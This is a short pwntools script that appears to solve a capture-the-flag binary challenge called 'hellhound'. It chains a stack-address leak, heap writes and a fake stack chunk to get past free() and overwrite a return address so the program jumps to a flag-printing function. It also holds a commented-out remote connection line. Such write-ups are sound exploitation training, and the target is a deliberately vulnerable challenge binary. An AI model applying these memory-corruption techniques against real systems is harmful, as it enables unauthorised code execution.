#!/usr/bin/env python3

from pwn import *

#The option 1 leaks a stack address..The chall is FULL Relro..We can use the stack leak to tamper the return address
#The option 2 allows us to enter  some data in heap 
#The option 3 takes the data+8 value and takes that address as the new buffer
#The hidden option 69 finally exits the program which calls the return address
#Using these options carefully we can make a stack return address overwrite to the berserk mode off function which prints the flag
#And then for exiting which frees the chunk finally.We have to make a fake chunk in stack to bypass the free and then return to the berserk mode off function

e = ELF("./hellhound_patched")
libc = ELF("./libc.so.6")
r = process("./hellhound_patched")
#r = remote("138.68.139.197",30703)
r.sendlineafter('>> ','1')
r.recvuntil('number: [')
stack_leak = int(r.recvuntil(b"]").strip(b"]").decode('latin-1'))
log.info(f'stack leak: {hex(stack_leak)}')

ret_address = stack_leak + 80
exploit = p64(0x21) + p64(stack_leak + 0x80) + p64(0) * 2
r.sendlineafter(b">>",'2')
r.sendafter(b"code:",b'A'*8 + p64(stack_leak + 0x60))
r.sendlineafter(b">>",b"3")
r.sendlineafter(b">>",b'2')
r.sendafter(b"code:",exploit)
r.sendlineafter(b">>",b"3")
r.sendlineafter(b">>",b'2')
r.sendafter(b"code:",p64(0x21) + p64(ret_address))
r.sendlineafter(b">>",b"3")
r.sendlineafter(b">>",b'2')
r.sendafter(b"code:",p64(e.sym.berserk_mode_off) + p64(stack_leak + 0x68))
r.sendlineafter(b">>",b"3")
r.sendlineafter(b">>",b"69")
r.interactive()
